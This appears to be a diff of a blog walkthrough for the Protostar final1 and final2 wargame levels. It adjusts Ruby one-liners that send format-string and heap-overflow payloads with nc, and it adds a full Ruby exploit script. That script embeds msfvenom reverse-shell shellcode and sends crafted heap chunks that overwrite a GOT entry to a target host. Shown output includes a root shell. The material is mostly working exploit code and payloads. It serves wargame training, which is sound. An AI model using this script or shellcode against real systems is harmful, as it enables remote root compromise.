@@ -954,7 +954,7 @@ challenges.</p>
 </span><span class='line'>> $'\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68'\
 </span><span class='line'>> $'\xd8\x45\xbb\x38\xd5\x98\xbc'
 </span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + ENV["buf"] + "A"*(109-105) + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$1887x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
+</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + ENV["buf"] + "A" * (109-105) + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$1887x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
 </span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
 </span><span class='line'>user@protostar:/tmp$ nc 0 2450
 </span><span class='line'>id
@@ -1158,7 +1158,7 @@ chunk, for example:</p>
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>1st chunk: "FSRD" + "0"*123+ "/"
+</pre></td><td class='code'><pre><code class=''><span class='line'>1st chunk: "FSRD" + "0" * 123 + "/"
 </span><span class='line'>2nd chunk: "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 103
 </span><span class='line'>3rd chunk: "XXXX"</span></code></pre></td></tr></table></div></figure>
 
@@ -1221,7 +1221,7 @@ chunk, for example:</p>
 </span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
 </span><span class='line'>
 </span><span class='line'># window 2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "0" * 123 +"/" + "FSRD"+"ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 107' | nc 0 2993
+</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "0" * 123 +"/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 107' | nc 0 2993
 </span><span class='line'>
 </span><span class='line'># window 1:
 </span><span class='line'>[New process 2405]
@@ -1429,7 +1429,7 @@ chunk, for example:</p>
 <span class='line-number'>28</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
 </span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X"*10 + "a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
+</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + "a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
 </span><span class='line'>
 </span><span class='line'>gdb> x /i 0x804e010
 </span><span class='line'>0x804e010:    jmp    0x804e01c
@@ -1444,7 +1444,7 @@ chunk, for example:</p>
 </span><span class='line'>0x804e07c:    0x64413764  0x39644138  0x00000084  0xfffffff8
 </span><span class='line'>0x804e08c:    0xfffffffc  0x0804d410
 </span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X"*10 + "D" * 107" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
+</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + "D" * 107" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
 </span><span class='line'>
 </span><span class='line'>gdb> x /30x 0x804e01c
 </span><span class='line'>0x804e01c:    0x44444444  0x44444444  0x44444444  0x44444444
@@ -1533,7 +1533,7 @@ chunk, for example:</p>
 </span><span class='line'>user@protostar:~$ nc -l -p 1337
 </span><span class='line'>
 </span><span class='line'># window 2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X"*10 + ENV["buf"] + "D" * (107 - ENV["buf"].length) + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
+</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + ENV["buf"] + "D" * (107 - ENV["buf"].length) + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
 </span><span class='line'>Process OK
 </span><span class='line'>
 </span><span class='line'># window 3:
@@ -1541,6 +1541,110 @@ chunk, for example:</p>
 </span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>
 
 
+
+
+<figure class='code'><figcaption><span>exploit-final2.rb </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># user@protostar:~$ objdump -TR /opt/protostar/bin/final2 | grep &quot;R_386_JUMP_SLOT.* write&quot;</span>
+</span><span class='line'><span class="c1"># 0804d41c R_386_JUMP_SLOT   write</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804d41c-0xc</span>
+</span><span class='line'><span class="c1"># $1 = 0x804d410</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># root@protostar:/tmp# ltrace  -e memset -f /opt/protostar/bin/final2 </span>
+</span><span class='line'><span class="c1"># [pid 2803] +++ exited (status 0) +++</span>
+</span><span class='line'><span class="c1"># [pid 2804] memset(0xbffff71c, &#39;\000&#39;, 16)     = 0xbffff71c</span>
+</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e008, &#39;\000&#39;, 132)    = 0x0804e008 &lt;= first chunk</span>
+</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e090, &#39;\000&#39;, 132)    = 0x0804e090 &lt;= second chunk</span>
+</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e118, &#39;\000&#39;, 132)    = 0x0804e118 &lt;= third chunk</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># root@kali32:~# ruby -e &#39;puts &quot;0x&quot;+(0x0804e008+&quot;FSDRAa0A&quot;.length).to_s(16)&#39;</span>
+</span><span class='line'><span class="c1"># 0x804e010</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &#39;\x0a\x0d\x5c\x00&#39; -f ruby</span>
+</span><span class='line'><span class="c1"># No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
+</span><span class='line'><span class="c1"># No Arch selected, selecting Arch: x86 from the payload</span>
+</span><span class='line'><span class="c1"># Found 22 compatible encoders</span>
+</span><span class='line'><span class="c1"># Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span>
+</span><span class='line'><span class="c1"># x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span>
+</span><span class='line'><span class="c1"># Payload size: 95 bytes</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xbf\x9e\x53\x7d\x18\xda\xc5\xd9\x74\x24\xf4\x5e\x33\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb1\x12\x31\x7e\x12\x83\xee\xfc\x03\xe0\x5d\x9f\xed\x2d</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb9\xa8\xed\x1e\x7e\x04\x98\xa2\x09\x4b\xec\xc4\xc4\x0c</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\x9e\x51\x67\x33\x6c\xe1\xce\x35\x97\x89\xaf\xc5\x67\x48</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\x38\xc4\x67\x4f\x81\x41\x86\xff\x97\x01\x18\xac\xe4\xa1</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\x13\xb3\xc6\x26\x71\x5b\xf6\x09\x05\xf3\x60\x79\x8b\x6a</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\x1f\x0c\xa8\x3e\x8c\x87\xce\x0e\x39\x55\x90</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">chunk1</span> <span class="o">=</span> <span class="s2">&quot;FSRD&quot;</span> <span class="o">+</span> <span class="s2">&quot;Aa0A&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\xeb\x0a</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">107</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span>
+</span><span class='line'><span class="n">chunk2</span> <span class="o">=</span> <span class="s2">&quot;FSRD&quot;</span> <span class="o">+</span> <span class="s2">&quot;ROOT/&quot;</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffff8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffffc</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804d410</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804e010</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span>  <span class="mi">103</span>
+</span><span class='line'><span class="n">chunk3</span> <span class="o">=</span> <span class="s2">&quot;DDDD&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">chunk1</span> <span class="o">+</span> <span class="n">chunk2</span> <span class="o">+</span> <span class="n">chunk3</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.154&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2993</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
+</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
